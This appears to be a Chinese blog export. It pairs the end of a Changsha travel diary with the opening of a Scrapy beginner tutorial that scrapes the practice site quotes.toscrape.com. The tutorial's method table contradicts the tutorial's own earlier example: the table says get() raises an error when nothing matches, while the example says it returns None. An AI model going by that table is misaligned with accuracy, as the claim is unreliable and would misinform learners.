<p>看着导航，一口气把主要闹区都逛遍了：国金中心楼顶、黄兴南路、杜甫江阁、文和友、解放西、坡子街。这个过程凭靠感觉，辅助以短视频的只言片语。国金中心内部并没有多少人，乘上数不尽的自动扶梯后，终于到达两个小人偶所在的楼顶花园。从楼顶往下看，就如同用上帝视角欣赏世间的繁华，以至于我在从国金中心楼顶坐观光电梯往下行时有一点恍惚，通过感受 60 秒别样引力，可以体验一把天庭打回人间的感觉（主要是我的电梯选的好）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240116_203634.webp" alt="IMG_20240116_203634.jpg|500"></p>
<p>黄兴路是那种各大城市都有的商业街，往近的来讲，就是扩大版的合肥淮河路、更接地气的天津和平路。但我还是要赞叹这里的热闹程度是我目前看到的最高、规模最大的。商圈内五步一臭豆腐、十步一茶颜悦色，臭豆腐的店都有各自的「创始人」和历史渊源背书，我觉得蛮有趣的。街头艺人持证上岗，管理比淮河路的牛鬼蛇神好多了。经营者们也深谙「流量密码」，只要在任何一个地方打上「长沙」两个大字再稍微装饰一下，就可以成为「网红打卡点」了。每个大城市都有一个「大观园」的「网红」店，长沙也不例外。</p>
<blockquote>
<p>大观园：南京秦淮河商区中某杂货店的名字。这种店门口一般布置得像水帘洞一样，有假山假瀑布假雾气，并有溶洞中类似彩色光点缀，有条件的店门口摆个孙悟空，网红设施（想你的风路牌、签名绸带、挂饰墙等）堆满门口过道。进去后其实就是小商品杂货店。因为各大城市商业街都有这种无语网红店，我统称为「大观园」。</p>
</blockquote>
<p>闹区与不闹区可以没有太多的过度地段：一盏大灯照过去，照亮的地方要多热闹有多热闹；没照到的小巷，潮湿闷臭的黑暗可以顺着你的目光连同你的整个人吞噬进去，而两个区域之间也只是光影的间隔而已。走尽黄兴南路，我向杜甫江阁出发。这一段路，才是一般城市夜晚真正的颜色：禁闭的店铺，临街的污水痕，幽暗的路灯，零星飞驰而过的快车。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240116_212746.webp" alt="IMG_20240116_212746.jpg|500"></p>
<p>开灯的杜甫江阁是挺漂亮的，门前也有很多人在拍照，但因为我并不懂其中的历史渊源，所以这景对我而言也就仅此而已了。湘江边年轻人准备好烟花燃放，歌声拌冷风回荡。往江的对岸看去，对着地图，我也隐约能看见橘子洲头上那个大雕像。对岸的岳麓山轮廓也被白灯打出一条浅浅的轮廓出来（让我想起厦门也有类似的景色）。</p>
<p>文和友是我误打误入走进的商业景区，它是仿 20 世纪 80 年代湖南老街的样子设计建造的。虽然是仿造的，但我看来确实弄得不错，挺壮观的，没有因仿制呈现出劣质的感觉。最奇妙的是，里面还有缆车，甚至还有专人看守的缆车道和人行处的「平交道口」。沿着散乱的水泥楼梯与铁扶手可以同向顶楼，由于人多路窄，我隐约感觉有坠人坠物的风险（你可以看见风格化的防坠网）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240116_220158.webp" alt="IMG_20240116_220158.jpg|500"></p>
<p>解放西路并没有看见短视频里说的热闹的地方，可能我并没有走到关键的区域。整个晚上绕着湖南最大商区一圈，第零天也饱览很多内容了，可能是由于太兴奋了，脚都不带停的。回到酒店看湖南茶文化频道，无聊又有趣哈哈。</p>
<p>本节小标题「长沙的夜」，期待未来有机会还能写一篇「长沙的夜生活」。</p>
<h1>Day 1 腿已经是橘子洲的形状</h1>
<p>第一天并没有想象中起得那么早哈。看过天气，我规划的第一个白天应当游玩室外景点——橘子洲头。受一条短视频影响，我决定可以去中途的万家丽逛逛，顺便弄个午餐吃。</p>
<p>未见万家丽，我就有先入为主的「又土又豪」的感知。看完后，我并没有短视频中说的「土到极致就是潮」的感觉，而是觉得整栋楼透出的是一种上一辈的中式思想。就像是一个土豪的精神输出平台，是它本人或某个代表团体的私人展和价值观展。它是极致的「国土」（与「国潮」一词相对）。因为万家丽可能就是个冷门景点，我当时也只是靠实地摸索找寻去往空中花园的道路，甚至是临时从游客交流的只言片语才知道顶楼还有个飞机坪景点。</p>
<p>商场不算热闹，商区楼层的顶部就是所谓的空中花园。亭台楼阁交错，金色大气的大雕像散落。白天看倒不觉得怎么样，晚上看就能想象出会很瘆人。同楼层的各种展览实在是很粗糙，内容倒是很正能量，中华传统文化以及中国近现代军事政治，适合中老年人看。重头戏蜡像馆蜡人们辣人眼，不收钱算是它的自知之明吧。空中花园坐电梯往上就能到达停机坪，即使是最顶楼你也能补习一下盘古开天辟地和女娲造人的过程。按照我的惯例绕了一圈，又冷又湿风又大，心无波澜结束宇宙中心万家丽的旅程。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240216224829.webp" alt="image.png|500"></p>
<p>长沙地铁对橘子洲头景点照顾有加，每次报站都会提醒乘客参观橘子洲头需要提前预约，从这一点可以看出这个景点在旺季时的人流量。我去的时候不是休息日，人不是很多。橘子洲头景点很久以前就有所耳闻，最大看点就是大雕像，但中间需要穿过长长的公园地带。大多数景区好像就是这么设置的，摆渡应该也是重要的营收手段之一。我寻思如果坐小火车的话，虽然不一会就到了，但拍完大雕像其实也没啥逛的了，如果又坐车回来，旅途效果可能不佳。如果选择步行可以体验自然气息，也不会错过景区的景点，到达终点时的感受也会不一样。</p>
<p>地铁站到大雕塑共 3 公里，我不带休息，一口气走完。快到目的地时嘴里已经开始嘟囔着很累了，双腿十分疲惫。远看主席头像的眼睛有光，我以为是里边有什么镂空结构透光。通过摄像机发现，那其实是两个突出的圆柱，虽有点突兀，但形成的光影效果不错，人物的神采也起来了。返程时打算买个半程车牌飘回去算了，正好售票亭前一对情侣和我的想法一样。通过他们的对话得知，如果已经买了全程车票（40 元）的可以在 300 米处的车站乘车，如果选择买半程车（20 元）就需要在 1800 米处的车站乘车。听到这个数字我心里有底了，那对情侣也一样。咬咬牙，再走回去得了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/jzztys.png" alt="image.png|500"></p>
<p>返程时的我已经肢体脱节，像 zombie 一般慢慢挪动。但是死脑筋的我那一刻都不想选择停歇，往常的旅行身边的伙伴都会提醒我歇息一会，这次没有旁人约束也就只能自己榨干自己了。平移过程中，我也不禁感叹这景区套路可以啊，跟鼋头渚一毛一样，不花钱就累死你。我 T🐱不知道多少次把双脚当卷尺用丈量了多少大型景点的周长：颐和园、北海公园、西湖、大蜀山……这到底是一种什么样的执念😅。</p>
<p>虽说只出行了一个下午，我的双腿说它已经没什么兴致游玩哪个景点了。但我还是不甘心，坐到五一广场站又下车了。当站在最初的十字口上，暗淡的暮和灰蒙蒙的水雾笼罩下，臭豆腐和烤地瓜拌路灯和车灯蒸腾。也是在那一刻我发现，五一广场本场就是个废弃的下沉广场和破旧的商圈，也快赶上我之前提到的「灯光照不到的那一侧」的样子了。瞎站了一会，唉，我累了，今天就到这里吧。</p>
<p>晚上我好好享受了茶颜悦色的面包丁，真的好吃。</p>
<h1>Day 2 人文与自然双修</h1>
<p>上午忙着选课，又被自己蠢到了，这里就不提了。之前预约好的上午博物院可能又是去不成了，下午只有花钱的临展票，基本展本身是免费的，但是约满的话只能通过购买临展票入馆参观基本展。通过网络查询和再三思索，决定还是买票算了，我也不敢像八达岭长城那次赌一把在错误时间入场。博物院所在的区域附近街景很普通，当天小雨，也稍有降温。门前人挤人，不过排队的都是买学生票的。博物院有 3 层，按照抖音上的指引，推荐的游览顺序为 2▶️3▶️1。来长沙两天，发现总能遇到说粤语的游客，这相比其他城市较多。</p>
<p>二楼是名为「湖南人」的展览。看了几个国家宝藏，了解了一点古代器具知识（现在忘了）。其实博物院并不见得很诚实，标记为复制品的一般就是复制品，但不标注的并不一定就是真品，这一点我是通过馆内人员与游客交流得知的。这也导致我现在看啥文物都觉得很怀疑。国宝人面鼎我觉得很有趣，好像中国文物除了三星堆，这样式的有点少见，古人审美有点超前，越看越觉得有点外星人文化遗产的感觉。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240216232526.webp" alt="image.png|500"></p>
<p>三楼到一楼的辛追夫人展我游览了两次，缘由将在后面提到。马王堆展览是我认为博物院中最精彩的部分，作为 20 世纪的考古大发现，博物院将发掘过程、历史缘由、文物展出环节安排得很有条理，一步步揭开面纱，带领我们走进辛追夫人，和观众一起完成一次考古之旅。以前对马王堆的了解还停留在小时候看的科教频道的相关节目，模糊有点印象，但也知道是一个十分惊奇的大发现。</p>
<p>守墓的小人张开双臂，看着显得有点呆滞但有很神秘。小人俑数目繁多，出土的器具栩栩如生，仿佛刚做出来的一样。但是那件镇馆之宝素纱单衣我感觉一般，我凑很近看，纱布一样的质感，有那么一点怀疑是假的。也是在那一时段，我才真正重新意识到，博物馆大多数就是展览陪葬品，古代的殡葬文化充当一台时代的照相机，把当时当地的风土人情凝结在土地深处。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217005105.webp" alt="image.png|500"></p>
<p>最让我赞叹的部分是 3 楼游览末尾会来到一个 1:1 复制的墓室，墓室中央是那个最神秘的大木箱（木椁），听到本地人说，往年还可以看到辛追夫人的投影。我们将从墓室顶端乘坐扶梯直接来到一楼。经过 3 楼的层层剖析，我们将来到最终的棺材部分，博物馆所剩的时间不多了，这使得我迫不及待的想要瞻仰辛追夫人。第一次看到辛追夫人时，我还以为是假的仿制模型：它的位置设置得十分低调（事后想想这样设置有他的道理），与墓室中心仅一个屏风之隔，没有我想象的那么多人的围观，指示标志并不算多（可见的仅有两个），如果你行走匆忙很容易错过。辛追夫人离我们并不算近，她平躺在特制的地宫之中，我戴着眼镜仔细看了好一会。其实经过特别处理之后遗体已经很干净，我感觉像橡胶质感，或泻了气的气球，皱又易破。五官的四官已经模糊，但是不管多少天后，穿越千年的辛追夫人的仪容还会幽幽复现在你的脑海中，让你不时汗毛竖起。我还是由衷感叹，辛追夫人的发现真的就是一个奇迹，一个考古奇迹和医学奇迹。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217004416.webp" alt="image.png|500"></p>
<p>观瞻完毕还是觉得意犹未尽，这结束的也太快了吧，前面我还为了节省时间加快了脚步。紧接着，我就马上参观 50 大洋门票的临展。当时预约临展时有两个选择：一个和欧洲希腊那一带的文明有关，一个是我国甘肃一带的文化展。考虑到为了避免乏味，可能需要中西调和，我选择参观了希腊的文物。和之前思考的一样，我认为欧洲这边应该也是殉葬品的展览。我对那边的历史其实不太敏感，这次的展览也符合我的刻板印象——基本上都是一些陶器和石雕。中间斯巴达分展区还出现了某游戏画面辅以理解......一个有趣的问题是，我发现中国和西方的墓葬形式有相似之处，又是埋佣又是埋器皿黄金或建筑微缩模型的。总之这个展也就那样，毕竟能出国的文物不会太精彩。我发现来看展的大多数都是学生模样，毕竟谁会花全票特地来看这东西🤯🤯🤯。50 块钱消费完毕后，我看还有时间打算重刷一遍马王堆，顺便参观一下 3 楼遗漏的两个小展。邻近闭馆，这一路上被工作人员催着小跑，但人少，拍照着实方便，我补拍了许多第一杯遍没拍好的文物。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240118_16231256.webp" alt="IMG_20240118_16231256.jpg|500"></p>
<p>离开博物院后在外面徘徊了好一阵，走错了路，又在西式快餐店被「赶跑」了，加上阴雨绵绵的冷天气，心情还是有点糟。为了不像昨天一样在酒店消耗夜晚，加上自我感觉今天逛的景点不太多，我决定晚上再去游玩另一个地方。没错，当前我对旅游的观念还是在尽可能看更多的景点不浪费时间。在厦门游玩的时候，同行伙伴实在是跟不上我的步伐，曾对我提出这个问题。但多游览更多景点是穷游的特点和主要目的之一，它可以以最少的代价对一座城市进行初步了解。我还做不到花上千上万块到马尔代夫在沙滩椅上睡一整天的这种旅游意境。这次的旅途我不会强逼自己，步数一到我自然会累，当日旅行自然终止。</p>
<p>简单吃过晚餐后，我来到了岳麓山开始第二处自然景观的旅程。我的计划是从东门出发，然后在南门结束。晚上没什么人来，我在山脚点了一杯茶颜悦色就上路了，想着接下来的水分和糖分就靠它补充了。茶颜悦色的服务跟合肥卡夫卡很像，就是服务态度好，而且会推荐你当场喝。它的购买策略是现点单，然后排队核销，核销到成品承诺 5 分钟内完成。其实我个人感觉茶水本身并没有什么特别之处，但是奶沫以及其上的碎屑都挺好吃的，像面包丁都单独作为产品拿出来卖。一个特点是在选择不打包时，店员会附上两张纸巾到你的手心，茶本身不加盖，这会让你的手牢牢把握住茶并存在一股隐形的力量督促你马上喝完。</p>
<p>虽然是晚上，前后见不着人的情况居多，但山上并不觉得有多可怕。大白灯向上打，加上雾气很重，天空看起来是白蒙蒙的，没有晚上八九点的感觉，况且主路是双车道公路。但这也使得这次路途我对绿色的森林没多大印象，只有浓重的雾气和惨白的大灯——这些灯应该就是能显出山轮廓的大灯。接近山顶时，可以看到雾气随风流动的景象，并能体验迷雾轻重变化的奇妙。和我参观过的市内小山一样，一般会存在一些军事基地。迷雾下的电视塔和雷达站有点像《三体 1》那种意境。让我感到害怕的时刻也不是没有，那就是我不选择走大公路而是选择石阶小路的时候。即使有大灯照，密林与暗草堆会静静凝视你孤单而又有些惶恐的脚步。加上对迷路的恐惧（本质是对导航可靠性的质疑），走小路没一会我就迫不及待想走大路。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240118_201514.webp" alt="IMG_20240118_201514.jpg|500"></p>
<p>南门出岳麓山后才发现，湖南大学好像是真·没有围墙的大学。爱晚亭那一带我就不去了，太晚了，据说也没什么可看的。晚上酒店看离谱抗日剧《代号九耳犬》，挺好玩的，像看短剧一样，不知不觉沉迷 2h，大脑得到有效放松。</p>
<h1>Day 3 冷天匆游，悲雨又悲冬</h1>
<p>第三天出门的时候已经下午了，天气变冷，公交亭等待 30 了三十分钟。今天计划游览天鹅湖区域的室内艺术展，也就是李自健艺术馆和谢子龙影像艺术馆。不得不说，高德对车到达车站时间的预测是挺准的。26 路车经过的都是一些硬核机构，什么法院、检察院、政府啥的。去到天鹅湖已经下午了，不过还好能看的地方不多，基本上把主要的都看了。</p>
<p>李自健艺术馆中基本上陈列的是它的油画作品。观展过程中，馆内除了门口处基本没有什么管理人员，这和我之前看展的情况有点不同，它好像挺信任观众的。看着这些油画我才知道，大型油画作品可以有一个微缩的草稿，一幅作品可以有多个修改版本，不同版本的作品也不会被浪费，它将发往各个不同级别的展览中。供艺术家施展能力的画幅是与自身财力相关的，这么多的这么大的油画，从美国运回来是挺费劲的。对画画我也一直有个疑问，模特也许可以一动不动供画家描绘，但动态场景的定格是不是只能靠画家想象来完成？</p>
<p>馆内不同区域划分出李自健不同时期不同地方写生的作品。人物很真实，这一点不用说；美国流浪汉肖像背景留白，显得很摩登；一楼的南京大屠杀题材作品吸引游客停留最久，一幅画作汇集屠·生·佛三个场景。路线的最后一站是馆长的个人生平，我总结就是家底 + 才华 + 贵人才成就如今的他。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240119_161641.webp" alt="IMG_20240119_161641.jpg|500"></p>
<p>天鹅湖区域是真的养天鹅，养好多只天鹅。好多处天鹅窝直接暴露在路边，游客可以零距离观察小鹅鹅。趁着还有一点时间，我紧接着参观不远处谢子龙艺术馆。可供免费参观的只有一个展——《错综的视线》。入口处管理人员要求相对严格，雨伞不让进，进去后往手背盖上一个章，不知道是章没墨了还是墨本身是特殊材料，我是没看到手上留有什么痕迹，也不懂其中的用意是什么。观展过程了解到很久以前就有人利用左右眼视觉差异制造了 3D 照片，当然这需要通过特殊的眼镜才能实现预期的效果。</p>
<p>错综的视线，展如其名，反正我不知道看啥，该看出些啥。有意识看过了单元介绍才知道，这是展示不同时代不同人拍摄对方的视点不同的展。但我感觉这一点和摄影技法相关，以及地区技能习得程度有关，和地域无关。馆里我觉得最有意思的不是展，而是它的男厕所小便池😲，洗手池就在小便池上方，这种设计我是第一次见直接惊呆😂。最不满的是入门后的大厅，诺大的空间连个坐的地方都不设置（估计是为了馆内的艺术性吧），一排排游客只能靠墙站蹲，很不体面。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240119_172639.webp" alt="IMG_20240119_172639.jpg|300"></p>
<p>出馆后天还没黑，但是下雨也冷。附近吃完桂林米粉暖暖身子打算就结束了吧。两次吃粉经历以及外卖我都发现一个共同点，店里会给你粉种类的选择：卷粉、圆粉、扁粉。我家里比较少见这样选法。</p>
<h1>Final Day 润</h1>
<p>3 天的旅行基本上把长沙市内主要景点都逛了一遍，其实五一商圈还有很多值得我探索的地方。整个旅程中，我领略较少的特色就是长沙美食了。长沙路边小吃摊除了臭豆腐还有个热卖商品是淀粉肠，也看到不少路边商贩卖马蹄（蔬菜）的。臭豆腐我是一次都没点，感觉全国各地的口味都一样，毕竟你在其他地方可以看到「长沙空运臭豆腐」的字样。粉店就是杀猪粉比较多，“湘菜”这个名字听起来就很辣。还有一个有趣的现象，就是地上普遍有槟榔渣，不时能从游客身上闻到槟榔味。我之所以能认出槟榔，还是因为我的那个湖南舍友😂。</p>
<p>地铁方面就是长沙的地铁不爱对齐车门，禁用口比较多且导航不更新。</p>
<p>最后一天凌晨坐高铁，郊区路段自己走已经习惯了。期待下次长沙之旅吧。</p>
<p>最后附本次旅行花费及信息总览：</p>
<table>
<thead>
<tr>
<th>行程与花费</th>
<th>Day 0</th>
<th>Day 1</th>
<th>Day 2</th>
<th>Day 3</th>
</tr>
</thead>
<tbody>
<tr>
<td>景点</td>
<td>🏙五一广场<br>🏙国金中心<br>🏙黄兴南路步行街<br>🏛杜甫江阁<br>🏙文和友<br>🏙解放西<br>🏙坡子街<br>门票总计：0</td>
<td>🏙万家丽<br>🏞橘子洲头<br><br><br><br><br><br>门票总计：0</td>
<td>🏠湖南省博物院<br>🏞岳麓山<br><br><br><br><br><br>门票总计：博物院临展 50</td>
<td>🏠李自健美术馆<br>🏠谢子龙影像艺术馆<br><br><br><br><br><br>门票总计：0</td>
</tr>
<tr>
<td>餐饮</td>
<td>晚餐：杀猪粉<br>零食：茶颜悦色<br><br>总计：34</td>
<td>午餐：中式快餐<br>晚餐：外卖<br><br>总计：49.2</td>
<td>午餐：外卖<br>晚餐：中式快餐<br>零食：茶颜悦色<br>总计：55.2</td>
<td>午餐：外卖<br>晚餐：桂林米粉<br>零食：酸奶<br>总计：47.8</td>
</tr>
<tr>
<td>交通</td>
<td>🚇地铁 7.2</td>
<td>🚇地铁 10.8</td>
<td>🚇地铁 9</td>
<td>🚌公交 2<br>🚇地铁 4.5</td>
</tr>
<tr>
<td>微信步数</td>
<td>12493<br>（包含另一城的交通）</td>
<td>20373</td>
<td>25603</td>
<td>8059</td>
</tr>
<tr>
<td>天气</td>
<td>☁</td>
<td>☁</td>
<td>🌧</td>
<td>🌧</td>
</tr>
</tbody>
</table>
<p>账单要点：</p>
<ul>
<li>包含了在长沙境内的所有消费。</li>
<li>日花费很少，但是算上住宿和来回高铁的话总共就小千了。</li>
<li>水都不用买，酒店提供。长沙特色美食真没胃口，因此也省的多。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3476966011" class="record">
            <header>
                <h1 class="record-title">Scrapy-入门篇</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('scrapy');">scrapy</button>
                    
                    <button class="btn" onclick="activeTag('python');">python</button>
                    
                    <button class="btn" onclick="activeTag('css');">css</button>
                    
                    <button class="btn" onclick="activeTag('XPath');">XPath</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>2/20/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240220045858.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>创建第一个 Scrapy 爬虫</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>cf3e4a7b</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>Scrapy (/ˈskreɪpaɪ/) 是一个爬取网页并提取结构化数据的应用框架，使用 Python 编写。官方文档：<a href="https://docs.scrapy.org/en/latest/intro/overview.html">Scrapy at a glance — Scrapy 2.11.1 documentation</a>。网上有许多教程，爬虫做是做出来了，但其中的原理可能讲得还不够清晰。我认为阅读官方文档将更有助于理解。</p>
<p>文章内容主要基于官方文档第一章 FIRST STEPS 进行补充。本文将通过爬取英文名人名言网站 <a href="https://quotes.toscrape.com">https://quotes.toscrape.com</a> 的例子初步理解 Scrapy，学会自己编写一个简单的爬虫。</p>
<blockquote>
<p>框架：是一个半成品软件，是一套可重用的、通用的、软件基础代码模型。基于框架进行开发，更加快捷、更加高效。</p>
</blockquote>
<h1>安装</h1>
<p>可以使用 pip 进行安装：</p>
<pre><code class="language-sh">pip install Scrapy
</code></pre>
<p>推荐单独为 Scrapy 创建一个 Python 虚拟环境（venv），不管是在哪个平台，以避免和系统中的其它包产生冲突。</p>
<h1>创建 Scrapy 项目</h1>
<p>在你想要创建 Scrapy 项目的位置执行以下命令：</p>
<pre><code class="language-sh">scrapy startproject tutorial # tutorial 改为你想要的项目名字
</code></pre>
<p>成功效果如图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220012641.webp" alt="image.png"></p>
<p>这时将会多出一个名为 tutorial，其内容如下：</p>
<pre><code class="language-tree">.
│   scrapy.cfg         # 部署参数文件
└───tutorial           # 项目的Python模块，你将从这里导入你的代码
    │   items.py       # 项目中定义 items 的文件
    │   middlewares.py # 项目middlewares文件
    │   pipelines.py   # 项目pipelines文件
    │   settings.py    # 项目设置文件
    │   __init__.py
    └───spiders        # 存放爬虫的文件夹 
            __init__.py 
</code></pre>
<p>我们需要定义一个类（这个类必须是 <code>scrapy.Spider</code> 的子类），Scrapy 使用这个类的信息去爬取网站。这个类定义了：</p>
<ul>
<li>爬取的第一个网站</li>
<li>【可选】如何继续生成下一个需要爬取的网页</li>
<li>【可选】如何解析下载下来的页面并提取信息</li>
</ul>
<p>我们可以在文件夹 <code>tutorial/spiders</code> 下创建我们第一个爬虫，文件名为 <code>quotes_spider.py</code>：</p>
<pre><code class="language-python">from pathlib import Path

import scrapy

class QuotesSpider(scrapy.Spider):
    name = &quot;quotes&quot; # 定义标识这个爬虫的名字，必须在整个项目中唯一

    def start_requests(self):
	    &quot;&quot;&quot;
	    定义爬虫从哪里开始爬取。
	    必须返回一个Requests类的可迭代对象（即一个request的列表或者写一个生成器函数，本示例为后者）。后续的请求将从这些初始请求依次生成。
	    &quot;&quot;&quot;
        urls = [
            &quot;https://quotes.toscrape.com/page/1/&quot;,
            &quot;https://quotes.toscrape.com/page/2/&quot;,
        ]
        for url in urls:
            yield scrapy.Request(url=url, callback=self.parse)

    def parse(self, response):
	    &quot;&quot;&quot;
	    用于处理每一个request对应的response的方法。
	    参数response是TextResponse的一个实例，它包含下载下来的页面的内容以及有用的处理函数。
	    parse()通常用于解析response，提取其中的数据形成字典（dict），然后提取下一个将要被爬取的URL链接并从中创建新的Request请求。
	    &quot;&quot;&quot;
        page = response.url.split(&quot;/&quot;)[-2]
        filename = f&quot;quotes-{page}.html&quot;
        Path(filename).write_bytes(response.body)
        self.log(f&quot;Saved file {filename}&quot;)
</code></pre>
<p>回到项目的顶层目录，执行以下命令运行我们刚刚创建的爬虫：</p>
<pre><code class="language-sh">scrapy crawl quotes
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220015148.webp" alt="image.png"></p>
<p>项目下多出以下两个文件，这两个文件就是两个网站的 HTML 数据。我们将在下一小节实现对数据的提取。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220015246.webp" alt="image.png"></p>
<p>让我们看看执行这个命令发生了什么？</p>
<ol>
<li><code>start_requests()</code> 方法返回 <code>scrapy.Request</code> 类供 Scrapy 进行调度</li>
<li>收到每一个 Request 的回复（response）后，Scrapy 实例化 <code>Response</code>，并调用对应 Request 的回调函数（在这个例子中回调函数为 <code>parse()</code>），将 <code>Response</code> 作为回调函数中的参数。</li>
</ol>
<p>上面的代码我们还可以进行简化：</p>
<pre><code class="language-python">from pathlib import Path

import scrapy

class QuotesSpider(scrapy.Spider):
    name = &quot;quotes&quot;
    # 我们可以直接定义全局变量start_urls，不用编写start_requests()函数
    start_urls = [
        &quot;https://quotes.toscrape.com/page/1/&quot;,
        &quot;https://quotes.toscrape.com/page/2/&quot;,
    ]
	# 虽然这里我们没有指明每一个request产生的response如何处理，但Scrapy默认parse()就是它们的回调函数。
    def parse(self, response):
        page = response.url.split(&quot;/&quot;)[-2]
        filename = f&quot;quotes-{page}.html&quot;
        Path(filename).write_bytes(response.body)
</code></pre>
<h1>提取数据的方法</h1>
<blockquote>
<p>如果你掌握浏览器开发者工具的使用，我们可以很轻松的完成这件事情（详看 <a href="#3753778605" title="Scrapy-充分利用浏览器中的开发者工具" class="record-link ">Scrapy-充分利用浏览器中的开发者工具</a>）。</p>
</blockquote>
<h2>使用 CSS 选择器</h2>
<p>按照官方文档中的教程，我们可以使用一个工具 Scrapy shell 对爬取的页面进行分析从而选择我们需要提取的数据。</p>
<p>在终端执行命令，我们会进入一个交互程序：</p>
<pre><code class="language-sh">scrapy shell 'https://quotes.toscrape.com/page/1/' # windows中可以使用双引号
# 注意链接使用引号括住，否则在链接包含参数（即链接中存在符号`&amp;`）的情况下命令会不起作用。
</code></pre>
<blockquote>
<p>输入 <code>quit()</code> 可退出 Scrapy shell</p>
</blockquote>
<p>我们可以 CSS 选择器选择 response 的元素。比如：<code>response.css(&quot;title&quot;)</code></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240220021614.webp" alt="image.png"></p>
<p>上图显示，CSS 选择器查询结果为 <code>Selector</code> 列表，<code>SelectorList</code>。这些选择器允许你进行更深入地查询或提取数据。</p>
<p>你可以继续进行交互：</p>
<pre><code class="language-python">In [1]: response.css(&quot;title&quot;)
Out[1]: [&lt;Selector xpath='descendant-or-self::title' data='&lt;title&gt;Quotes to Scrape&lt;/title&gt;'&gt;]

# 加上::text表明我们只选择标签内的文本。getall()方法将返回一个列表，包含所有可能的结果。
In [2]: response.css(&quot;title::text&quot;).getall()
Out[2]: ['Quotes to Scrape']

# 不加上的话我们将得到包含标签在内的内容
In [3]: response.css(&quot;title&quot;).getall()
Out[3]: ['&lt;title&gt;Quotes to Scrape&lt;/title&gt;']

# get() 直接返回第一个结果。若选择器无结果返回None。
In [4]: response.css(&quot;title::text&quot;).get()
Out[4]: 'Quotes to Scrape'

# 除此之外还可以这样写。但是如果css没有结果将报错 IndexError: list index out of range
In [5]: response.css(&quot;title::text&quot;)[0].get()
Out[5]: 'Quotes to Scrape'

# 我们还可以使用正则表达式
In [6]: response.css(&quot;title::text&quot;).re(r&quot;(\w+) to (\w+)&quot;)
Out[6]: ['Quotes', 'Scrape']
</code></pre>
<p>如果你想直接打开爬取到的页面，输入以下命令后页面将从浏览器中被打开方便你使用浏览器自带的调试工具找出正确的 CSS 选择器。</p>
<pre><code class="language-python">In [7]: view(response)
Out[7]: True
</code></pre>
<h2>使用 XPath</h2>
<p>Scrapy 支持 XPath 表达式。</p>
<pre><code class="language-python">In [8]: response.xpath(&quot;//title&quot;)
Out[8]: [&lt;Selector xpath='//title' data='&lt;title&gt;Quotes to Scrape&lt;/title&gt;'&gt;]

In [9]: response.xpath(&quot;//title/text()&quot;).get()
Out[9]: 'Quotes to Scrape'
</code></pre>
<p>在 Scrapy 中，推荐使用 XPath 表达。</p>
<blockquote>
<p>实际上，Scrapy 处理 CSS 选择器最终还是会转换成 XPath 表达。你可以在 shell 中发现这个过程。</p>
</blockquote>
<h2>关于提取的方法</h2>
<p>不管是 css 选择器还是 XPath 表达，都可以使用以下方法提取我们需要的内容：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>extract()</code></td>
<td>返回的是符合要求的所有的数据，存在一个列表里。</td>
</tr>
<tr>
<td><code>extract_first()</code></td>
<td>返回的 hrefs 列表里的第一个数据。</td>
</tr>
<tr>
<td><code>get()</code></td>
<td>和 extract_first() 方法返回的是一样的，都是列表里的第一个数据。</td>
</tr>
<tr>
<td><code>getall()</code></td>
<td>和 extract() 方法一样，返回的都是符合要求的所有的数据，存在一个列表里。</td>
</tr>
</tbody>
</table>
<p>注意：</p>
<ul>
<li>get() 、getall() 方法是新的方法，取不到就 raise 一个错误。</li>
<li>extract() 、extract_first() 方法是旧的方法，取不到就返回 None。</li>
</ul>
<blockquote>
<p>本文按照官方文档示例继续使用旧的 get、getall 方法</p>
</blockquote>
<h1>爬虫中编写提取数据的逻辑</h1>
<p>在目标网站 <a href="https://quotes.toscrape.com">https://quotes.toscrape.com</a> 中，每一句名人名言的 HTML 基本结构如下（以某一句名言为例）：</p>
<pre><code class="language-html">&lt;div class=&quot;quote&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/CreativeWork&quot;&gt;
	&lt;span class=&quot;text&quot; itemprop=&quot;text&quot;&gt;“The world as we have created it is a process of our thinking. It cannot be changed without changing our thinking.”&lt;/span&gt;
	&lt;span&gt;by &lt;small class=&quot;author&quot; itemprop=&quot;author&quot;&gt;Albert Einstein&lt;/small&gt;
	&lt;a href=&quot;/author/Albert-Einstein&quot;&gt;(about)&lt;/a&gt;
	&lt;/span&gt;
	&lt;div class=&quot;tags&quot;&gt;
		Tags:
		&lt;meta class=&quot;keywords&quot; itemprop=&quot;keywords&quot; content=&quot;change,deep-thoughts,thinking,world&quot;&gt; 
		&lt;a class=&quot;tag&quot; href=&quot;/tag/change/page/1/&quot;&gt;change&lt;/a&gt;
		&lt;a class=&quot;tag&quot; href=&quot;/tag/deep-thoughts/page/1/&quot;&gt;deep-thoughts&lt;/a&gt;
